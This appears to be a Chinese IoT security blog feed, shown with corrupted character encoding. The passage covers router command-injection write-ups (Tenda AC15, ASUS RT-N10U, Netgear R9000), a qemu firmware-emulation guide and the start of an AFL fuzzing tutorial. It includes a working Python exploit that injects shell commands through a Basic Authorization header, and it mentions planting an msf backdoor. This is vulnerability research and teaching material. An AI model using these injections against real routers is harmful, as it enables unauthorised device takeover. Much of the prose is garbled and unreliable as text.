AC15å‘½ä»¤æ‰§è¡Œï¼ˆgoform&#x2F;setUsbUnloadï¼‰</h3><p>TendaAC15è€æœ‹å‹äº†ï¼Œå…ˆæŠŠhttpdæœåŠ¡èµ·èµ·æ¥</p><p>goformï¼Œå¾ˆçœ¼ç†Ÿï¼Œä¼°è®¡èµ·webæœåŠ¡çš„æ˜¯gohead</p><p>æ¼æ´æè¿°éƒ½è¯´æ˜¯åœ¨setUsbUnloadäº†ï¼Œåœ¨httpdæœä¸€ä¸‹å­—ç¬¦ä¸²</p><p><img src="/img/iot1/3.png" alt="img"></p><p>å•Šè¿™ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£å°±ç›´æ¥æä¸ªPOSTè¯·æ±‚çœ‹ä¸€ä¸‹</p><p><img src="/img/iot1/4.png" alt="img"></p><p><img src="/img/iot1/5.png" alt="img"></p><h3 id="DIR818Lå‘½ä»¤æ‰§è¡Œ-ï¼ˆ-etc-script-IPV4-INET-PHPï¼‰"><a href="#DIR818Lå‘½ä»¤æ‰§è¡Œ-ï¼ˆ-etc-script-IPV4-INET-PHPï¼‰" class="headerlink" title="DIR818Lå‘½ä»¤æ‰§è¡Œ ï¼ˆ&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHPï¼‰"></a>DIR818Lå‘½ä»¤æ‰§è¡Œ ï¼ˆ&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHPï¼‰</h3><p>æéº»éº»æ»´</p><p>å®¡äº†åŠå¤©ï¼Œçœ‹äº†wpæ‰çŸ¥é“æ˜¯webæ´ï¼Œä¼šä¸äº†ä¸€ç‚¹</p><p>è€Œä¸”è¿™ä¸ªç½‘è·¯æœåŠ¡æ˜¯HNAP1ï¼ŒSOAPåè®®çš„ï¼Œxmlè¯­è¨€çœ‹èµ·æ¥æŒºå¥½æ‡‚å¾—ï¼Œå°±æ˜¯è¿™ä¸ªåŠŸèƒ½APIå®åœ¨æ˜¯å¤ªæŠ˜ç£¨äº†</p><h3 id="ASUS-RT-N10U-ï¼ˆping-è¿‡æ»¤ä¸ä¸¥ï¼‰"><a href="#ASUS-RT-N10U-ï¼ˆping-è¿‡æ»¤ä¸ä¸¥ï¼‰" class="headerlink" title="ASUS RT-N10U ï¼ˆping è¿‡æ»¤ä¸ä¸¥ï¼‰"></a>ASUS RT-N10U ï¼ˆping è¿‡æ»¤ä¸ä¸¥ï¼‰</h3><p>å¥½åƒPingå‘½ä»¤æ£€æµ‹ç½‘ç»œè”é€šæ€§çš„åœ°æ–¹æŒºå®¹æ˜“å‡ºç°RCEçš„</p><p>burpæŠ“ä¸ªåŒ…çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ</p><p><img src="/img/iot1/6.png" alt="img"></p><p>ï¼ŸSystemCmdï¼Œé‚£å°±æŒ‰ç…§ç‰¹å®šå­—ç¬¦ä¸²æœä¸€ä¸‹ï¼Œå®šä½åˆ°&#x2F;usr&#x2F;sbin&#x2F;httpdï¼Œåœ¨é‡Œé¢æ‰¾åˆ°äº†å¯¹åº”çš„å‡½æ•°</p><p><img src="/img/iot1/7.png" alt="img"></p><p>sys_script</p><p><img src="/img/iot1/8.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨get_cgiæ¥å—SystemCmdå‚æ•°åï¼Œè™½ç„¶æœ‰ä¸€ç‚¹è¿‡æ»¤ã€‚ä½†æ˜¯åå¼•å·**&#96; $()**è¿™äº›å†…æ•›æ‰§è¡Œç»•è¿‡å¹¶æ²¡æœ‰è¿‡æ»¤æ‰</p><p>å°†V7æ‹·è´åˆ°ä½äºbssæ®µçš„SystemCmdåï¼Œå°±ç›´æ¥ç”¨sys_scriptç›´æ¥æ‰§è¡Œäº†ï¼Œæ‰€ä»¥å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„RCE</p><p>ä¼ äº†ä¸ªmsfç”Ÿæˆçš„backdoor</p><p><img src="/img/iot1/9.png" alt="img"></p><h3 id="Netgear-R9000ï¼ˆ-cgi-binç™»å½•è®¤è¯æ—¶æ²¡æœ‰å¯¹Authorizationgè¿‡æ»¤ï¼‰"><a href="#Netgear-R9000ï¼ˆ-cgi-binç™»å½•è®¤è¯æ—¶æ²¡æœ‰å¯¹Authorizationgè¿‡æ»¤ï¼‰" class="headerlink" title="Netgear R9000ï¼ˆ&#x2F;cgi-binç™»å½•è®¤è¯æ—¶æ²¡æœ‰å¯¹Authorizationgè¿‡æ»¤ï¼‰"></a>Netgear R9000ï¼ˆ&#x2F;cgi-binç™»å½•è®¤è¯æ—¶æ²¡æœ‰å¯¹Authorizationgè¿‡æ»¤ï¼‰</h3><p>ç™»å½•è®¤è¯çš„æ—¶å€™æ²¡æœ‰å¯¹Authorizationè¿›è¡Œcheck</p><p>æ¼æ´å¯ä»¥ç›´æ¥å®šä½åˆ°&#x2F;usr&#x2F;sbin&#x2F;uhttpdä¸­çš„<code>uh_cgi_auth_check</code></p><p><img src="/img/iot1/10.png" alt="img"></p><p>é€»è¾‘å¾ˆç®€å•ï¼Œæ¥æ”¶åˆ°Authorizationçš„å†…å®¹åï¼ŒæŠŠ<code>Basic </code>åçš„å†…å®¹base64è§£å¯†ï¼Œå¹¶æŠŠpasswordæ‹¼æ¥åæ‰§è¡Œ</p><p>æœ¬æ„æ˜¯æƒ³æŠŠpasswordçš„hashå€¼ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå´å› ä¸ºè¿‡æ»¤ä¸ä¸¥å¯¼è‡´rce</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = &quot;http://81.68.182.195:56898/cgi-bin&quot;<br>cmd = base64.b64encode(b&quot;admin:;ls /&gt;/www/cmd.txt;&quot;)<br><br>headers=&#123;<br>    &quot;Host&quot;: &quot;81.68.182.195:56898&quot;,<br>    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br>    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;,<br>    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,<br>    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,<br>    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,<br>    &quot;Connection&quot;: &quot;keep-alive&quot;,<br>    &quot;Authorization&quot;: b&quot;Basic &quot; + cmd,<br>&#125;<br># payload = &quot;ls &gt;/www/ls.txt&quot;<br># res = requests.<span class="hljs-keyword">get</span>(url=url,auth=(&quot;admin&quot;,payload))<br># print(res.text)<br>res = requests.<span class="hljs-keyword">get</span>(url=url,headers=headers,timeout=<span class="hljs-number">1</span>)<br>print(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/iot1/11.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å›ºä»¶æ¨¡æ‹ŸæŒ‡åŒ—</title>
    <link href="/2023/07/30/Fuzz1/"/>
    <url>/2023/07/30/Fuzz1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>å›ºä»¶æ¨¡æ‹Ÿè¿™ä¸ªç©æ„ç¬”è€…ä¹Ÿä¸æƒ³å¤šè¯´ä»€ä¹ˆï¼Œçº¯çº¯çš„æŠ˜ç£¨è‡ªå·±ï¼Œä½†æ˜¯è¿˜ä¸å¾—ä¸æï¼ˆä¸»è¦æ˜¯å®åœ¨æ˜¯å¤ªç©·æ²¡æœ‰ç±³ä¹°è®¾å¤‡ï¼‰</p><p>æœ€è¿‘æŠŠä¸»æµçš„å›ºä»¶æ¨¡æ‹Ÿæ–¹æ³•éƒ½è¿‡äº†ä¸€éï¼Œäºæ˜¯ç¬”è€…å°±æƒ³æ°´ç¯‡åšå®¢é¡ºå¸¦è®°ç‚¹ç¬”è®°ã€‚</p><p>é‰´äºå›ºä»¶æ¨¡æ‹Ÿæœ‰å„ç§è–›å®šè°”çš„æŠ¥é”™ï¼Œç¬”è€…ä½¿ç”¨çš„è¾ƒä¸ºç¨³å®šçš„ubuntu20.04</p><p>ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><h1 id="0x1-æ¡†æ¶æ¨¡æ‹Ÿ"><a href="#0x1-æ¡†æ¶æ¨¡æ‹Ÿ" class="headerlink" title="0x1:æ¡†æ¶æ¨¡æ‹Ÿ"></a>0x1:æ¡†æ¶æ¨¡æ‹Ÿ</h1><p>ç›´æ¥å·¥å…·ä¸€æŠŠæ¢­å“ˆ</p><h2 id="FirmAE-Firmadyne"><a href="#FirmAE-Firmadyne" class="headerlink" title="FirmAE &amp; Firmadyne"></a>FirmAE &amp; Firmadyne</h2><p>è¿™ä¸¤ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œèƒ½ä¸èƒ½æ¨¡æ‹Ÿèµ·æ¥çº¯é è¿æ°”</p><p>ç¬”è€…æ›´å€¾å‘äºFirmAEä¸€ç‚¹ï¼Œä¸»è¦æ˜¯æ‡’ç‹—ä¸€æ¡ï¼Œèƒ½ç›´æ¥ä¸€è¡Œcommandå®Œäº‹çš„äº‹æƒ…è°ä¼šæƒ³æ“ä¸€ä¸ªå¯åŠ¨è„šæœ¬å‘¢</p><p>å…³äºè¿™ä¸¤ä¸ªæ¡†æ¶çš„å…·ä½“ä¿¡æ¯å¯ä»¥ç›´æ¥åœ¨githubæ‰¾</p><p><a href="https://github.com/pr0v3rbs/FirmAE">pr0v3rbs&#x2F;FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com)</a></p><p><a href="https://github.com/firmadyne/firmadyne">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p><h2 id="Fact-core"><a href="#Fact-core" class="headerlink" title="Fact_core"></a>Fact_core</h2><p>dockeræ‹‰äº†ä¸¤ä¸ªå°æ—¶æ²¡æ‹‰ä¸‹æ¥ï¼Œæéº»éº»æ»´ï¼Œä¸åšè¯„ä»·</p><h1 id="0x2-Qemuæ¨¡æ‹Ÿ"><a href="#0x2-Qemuæ¨¡æ‹Ÿ" class="headerlink" title="0x2:Qemuæ¨¡æ‹Ÿ"></a>0x2:Qemuæ¨¡æ‹Ÿ</h1><p>æœ‰ä¸€è¯´ä¸€è™šæ‹ŸåŒ–çœŸçš„æ˜¯ä¸ªç¥å¥‡çš„æŠ€æœ¯ï¼Œç¬”è€…ç°åœ¨ä¹Ÿå¯¹<strong>Virtualization</strong>é€æ¸èµ·äº†å…´è¶£</p><p>è¨€å½’æ­£ä¼ ï¼Œqemuæ¨¡æ‹Ÿæœ‰ä¸¤ä¸ªä¸åŒçš„æ¨¡å¼ï¼Œuseræ¨¡å¼å’Œsystemæ¨¡å¼ï¼Œåœ¨æœ¬ç¯‡åšå®¢ä¸­ï¼Œä¸¤ç§æ¨¡å¼éƒ½ä¼šè¯¦ç»†ä»‹ç»</p><h2 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu user"></a>qemu user</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>useræ¨¡å¼ä¸‹æ¨¡æ‹Ÿè¾ƒä¸ºä¾¿æ·ï¼Œè¿™è¾¹å°±ä»¥å…¸å‹çš„<strong>Tenda AC15</strong>æ¥ä½œä¸ºä¾‹å­<a href="(https://www.tenda.com.cn/download/detail-2680.html)">å›ºä»¶ä¸‹è½½</a></p><p>å…ˆçœ‹ä¸€ä¸‹æ¶æ„ï¼ˆä¸€èˆ¬éƒ½æ˜¯æŸ¥çœ‹&#x2F;bin&#x2F;busyboxï¼‰ï¼Œæ˜¯armï¼Œå°ç«¯åºï¼ŒåŠ¨æ€é“¾æ¥</p><p>ä¸”åœ¨&#x2F;binä¸­å­˜åœ¨httpdå¯æ‰§è¡Œæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å°è¯•è¿è¡Œä¸€ä¸‹httpd</p><p>é¦–å…ˆå› ä¸ºhttpdæ˜¯å¼‚æ¶æ„çš„åŠ¨æ€é“¾æ¥ï¼Œæ‰€ä»¥æ¨¡æ‹Ÿçš„æ—¶å€™æœ€å¥½ç›´æ¥ç”¨é™æ€ç¼–è¯‘çš„qemu</p><p>å…ˆä¸‹è½½qemu-user-static</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ°å¯¹åº”æ¶æ„çš„qemu-user-staticï¼Œå¤åˆ¶åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">which qemu-arm-<span class="hljs-keyword">static</span><br>cp [path <span class="hljs-keyword">to</span> qemu-arm-<span class="hljs-keyword">static</span>] .``<br></code></pre></td></tr></table></figure><p>å°†squashfs-rootåˆ‡æ¢ä¸ºæ ¹ç›®å½•ï¼Œuseræ¨¡å¼æ‰§è¡Œ.&#x2F;bin&#x2F;httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-arm-static ./bin/httpd<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œäº†ï¼Œä½†æ²¡å®Œå…¨æ‰§è¡Œï¼Œä½†è‡³å°‘æˆ‘ä»¬å¯ä»¥ç¡®å®šè¿™æ ·æ˜¯æœ‰å¯è¡Œæ€§çš„ï¼ˆyes,we love linux!!!)</p><p><img src="/img/FW/0.png" alt="img"></p><p>æŠŠhttpdæ‹–è¿›idaï¼Œæ ¹æ®ç›¸åº”å¾—å­—ç¬¦ä¸²ï¼Œçœ‹ä¸€ä¸‹æ˜¯å“ªè¾¹å¡ä½äº†</p><p>åœ¨é‚£è¾¹ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åç”¨IDAè¿œç¨‹è°ƒå¼åº·åº·ä»€ä¹ˆæƒ…å†µï¼ŒGDBåº”è¯¥ä¹Ÿè¡Œ</p><p><img src="/img/FW/1.png" alt="img"></p><p>å•æ­¥æ­¥è¿›ï¼Œçœ‹åˆ°R0å¯„å­˜å™¨è¢«èµ‹å€¼0ï¼Œéšåå°±åªèƒ½è·³è½¬åˆ°0x2E514ï¼Œæ‰€ä»¥ä½¿ç”¨keypatchæ¥ç»•è¿‡è¿™ä¸ªè¿™ä¸ªæ£€æµ‹</p><p><img src="/img/FW/2.png" alt="img"></p><p><img src="/img/FW/3.png" alt="img"></p><p>å†æ‰§è¡Œçœ‹çœ‹ä¼šæ€ä¹ˆæ ·</p><p>åˆå¯„äº†ï¼Œé‚£å°±å†åŠ¨è°ƒä¸€ä¸‹</p><p><img src="/img/FW/4.png" alt="img"></p><p>å¯æœ‰çœ‹åˆ°è¿™è¾¹åˆæœ‰ä¸€ä¸ªå’Œåˆšæ‰ç±»ä¼¼å¾—patchï¼Œé‚£å°±æ•…æŠ€é‡æ–½</p><p><img src="/img/FW/5.png" alt="img"></p><p><img src="/img/FW/6.png" alt="img"></p><p>å†æ¬¡æ‰§è¡Œï¼ŒæˆåŠŸäº†ï¼Œä½†æ²¡å®Œå…¨æˆåŠŸï¼Œ255.255.255.255æ˜¯ç»™äººè®¿é—®çš„ï¼Ÿé‚£åªèƒ½ç»§ç»­è°ƒäº†</p><p><img src="/img/FW/7.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å‰é¢çš„ä¸¤å¤„patchéƒ½æ˜¯ä¸ºäº†æ‰§è¡Œ<strong>ConnectCfm</strong>ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯ä¸€äº›å˜é‡çš„è·å–</p><p>åœ¨<strong>GetLanIfName</strong>ä¹‹åï¼ŒçŒœæµ‹**GetValue(â€œlan.ipâ€, s);**ä¾¿æ˜¯å¯¼è‡´ipä¸æ­£å¸¸çš„ç½ªé­ç¥¸é¦–</p><p>é‚£å°±æŸ¥çœ‹ä¸€ä¸‹å¤–éƒ¨è°ƒç”¨<strong>GetLanIfName</strong></p><p><strong>GetLanIfName</strong>è¢«å®šä¹‰åœ¨<strong>lib&#x2F;libcommon.so</strong>ä¸­ï¼Œå¤–éƒ¨è°ƒç”¨äº†<strong>get_eth_name</strong></p><p><img src="/img/FW/11.png" alt="img"></p><p>å¤–éƒ¨è°ƒç”¨å‡½æ•°<strong>get_eth_name</strong>è¢«å®šä¹‰<strong>lib&#x2F;libChipApi.so</strong>åœ¨ä¸­ï¼Œå…·ä½“functionæ˜¯è·å–ç½‘å¡åç§°ï¼Œä½†æ˜¯æœ¬æœºä¸­æ— æ³•åŒ¹é…ä¸ä¹‹ç›¸åº”çš„ç½‘å¡</p><p><img src="/img/FW/8.png" alt="img"></p><p>æ‰€ä»¥é‚£å°±èµ·ä¸€ä¸ªåç§°ä¸º<strong>br0</strong>çš„ç½‘å¡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> brctl addbr br0<br><span class="hljs-attribute">sudo</span> ifconfig br0 <span class="hljs-number">192.168.10.144</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸï¼ï¼ï¼</p><p><img src="/img/FW/9.png" alt="img"></p><p>è®¿é—®ä¸€ä¸‹ipè¯•è¯•</p><p>è‰ï¼Œè®¿é—®å¤±è´¥ï¼Œé¦™æ§Ÿå¼€æ—©äº†</p><p><img src="/img/FW/12.png" alt="img"></p><p>é‚£å°±åªèƒ½åœ¨å¯åŠ¨çš„æ—¶å€™åŠ ä¸Š<strong>â€“strace</strong>å‚æ•°çœ‹çœ‹å…·ä½“æ‰§è¡Œè¿‡ç¨‹äº†</p><p>æœç„¶ï¼Œåœ¨è®¿é—®**&#x2F;webroot&#x2F;main.html**æ—¶å‘ç”Ÿäº†æŠ¥é”™</p><p><img src="/img/FW/13.png" alt="img"></p><p>ä»”ç»†ä¸€çœ‹webrootè¿™ä¸ªæ–‡ä»¶å¤¹æ˜¯ç©ºçš„ï¼Œè€Œé‚£äº›main.htmlæ–‡ä»¶å…¨åœ¨æ–‡ä»¶å¤¹webroot_roä¸­</p><p><img src="/img/FW/14.png" alt="img"></p><p>é‚£å°±åªèƒ½æŠŠwebrootç»™åˆ äº†ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªè½¯è¿æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf webroot<br>sudo <span class="hljs-built_in">ln</span> -s webroot_ro/ webroot<br></code></pre></td></tr></table></figure><p>å†è®¿é—®ä¸€ä¸‹ï¼ŒæˆåŠŸï¼ï¼</p><p><img src="/img/FW/15.png" alt="img"></p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>è¿™ä¸ªæ‰‹æ³•å¤ªè¶…å‰äº†ï¼Œç­‰é“¸å¸ç¬”è€…å­¦æˆå½’æ¥å†è¯´</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu system"></a>qemu system</h2><p>è¿™æ—¶å€™å°±åˆ°äº†å…¨ç³»ç»Ÿæ¨¡æ‹Ÿäº†</p><p>winmtğŸ‘´çš„æ–‡ç« ä¸­æœ‰å¾ˆè¯¦ç»†çš„æµç¨‹[<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">åŸåˆ›] ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>ç‹æŒ‡å¯¼ç”¨çš„æ˜¯ubuntu20ï¼Œä½†æˆ‘åªæœ‰ubuntu16èƒ½æˆåŠŸèµ·èµ·æ¥</p><p>æ–‡ç« ä¸­é‚£ä¸ªé•œåƒçš„é“¾æ¥å¥½åƒæœ‰ç‚¹å°é—®é¢˜ï¼Œç¬”è€…è¿™è¾¹è´´ä¸€ä¸ª<a href="https://files.sboc.dev/images/">images (sboc.dev)</a>ï¼Œé‡Œé¢è¿˜æœ‰systemæ¨¡å¼å¯åŠ¨è„šæœ¬ï¼ŒçœŸçš„æˆ‘å“­æ­»</p><p>è¿™è¾¹è¿˜æ˜¯ç”¨Tenda AC15çš„å›ºä»¶ä½œä¸ºç¤ºèŒƒ</p><p>é•œåƒèµ·èµ·æ¥åï¼Œä¿è¯qemué‡Œçš„ipèƒ½å’Œå¤–ç½‘pingé€šã€‚</p><p>æœ¬åœ°å¼€ä¸€ä¸ªhttpæœåŠ¡æˆ–è€…ç”¨scpæŠŠsquashfs-rootä¼ è¾“è¿›å»</p><p>ä½¿ç”¨å‘½ä»¤æŒ‚è½½å¹¶åˆ‡æ¢æ ¹ç›®å½•</p><p><img src="/img/FW/16.png" alt="img"></p><p>æ¥ä¸‹æ¥ä¾¿æ˜¯æŠŠpatchå¥½çš„httpdæ›¿æ¢æ‰åŸæœ¬çš„</p><p>è®¾ç½®ç½‘å¡äº†br0ï¼Œä½†é»˜è®¤çš„busyboxä¸­ä¸å­˜åœ¨brctlæŒ‡ä»¤ï¼Œgithubä¸Šéšä¾¿æ‰¾ä¸ªç¼–è¯‘å¥½çš„armæ¶æ„çš„busyboxä¼ è¿›å»å°±è¡Œ</p><p>å¯åŠ¨httpd</p><p><img src="/img/FW/17.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into the afl</title>
    <link href="/2023/07/18/fuzz0/"/>
    <url>/2023/07/18/fuzz0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>åœ¨ç¬”è€…çœ‹æ¥ï¼Œfuzzæ— ç–‘æ˜¯ä¸€ä¸ªå¤©æ‰çš„æƒ³æ³•ï¼Œé€šè¿‡è‡ªåŠ¨åŒ–çš„å¤§é‡çš„éšæœºæ•°æ®æµ‹è¯•ï¼Œè¿›è¡Œæ¼æ´æŒ–æ˜ã€‚</p><p>ç¬”è€…ä¸€ç›´å¾ˆæƒ³å­¦ä¹ è¿™ä¸€æ–¹é¢çš„çŸ¥è¯†ï¼Œåœ¨ç²—ç•¥çš„æ‹œè¯»å®Œ<strong>Fuzzing: A Survey for Roadmap</strong>ä¹‹åï¼Œæ°å¥½æš‘å‡ä¹Ÿæœ‰ç‚¹ç©ºé—²æ—¶é—´ï¼ˆ<del>ä¸»è¦æ˜¯æ”¾äº†ä¸¤ç¤¼æ‹œå‡ä»€ä¹ˆä¹Ÿæ²¡å¹²æœ‰ç‚¹è‰¯å¿ƒä¸å®‰</del>ï¼‰ï¼Œä¾¿æ‰“ç®—ä»aflå…¥æ‰‹æ¥å­¦ä¹ fuzzã€‚</p><h1 id="0x1-åˆæ¢"><a href="#0x1-åˆæ¢" class="headerlink" title="0x1:åˆæ¢"></a>0x1:åˆæ¢</h1><p>ä¸‹è½½å®‰è£…ä»€ä¹ˆçš„ç½‘ä¸Šå¯ä»¥è‡ªå·±æ‰¾æwakuwaku</p><p>é¦–å…ˆå‘¢å¯ä»¥è‡ªå·±å…ˆéšéå†™ä¸€äº›æµ‹è¯•ç”¨ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="hljs-number">666</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; OK ,it is safe&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv, <span class="hljs-type">char</span> *envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey0sh1&#x27;s AFL test!!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input your content: &quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<br>    <span class="hljs-built_in">test</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†åˆ«ç”¨gccå’Œafl-gccç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc ./test.c -o <span class="hljs-built_in">test</span><br>/path/to/afl-gcc ./test.c -o 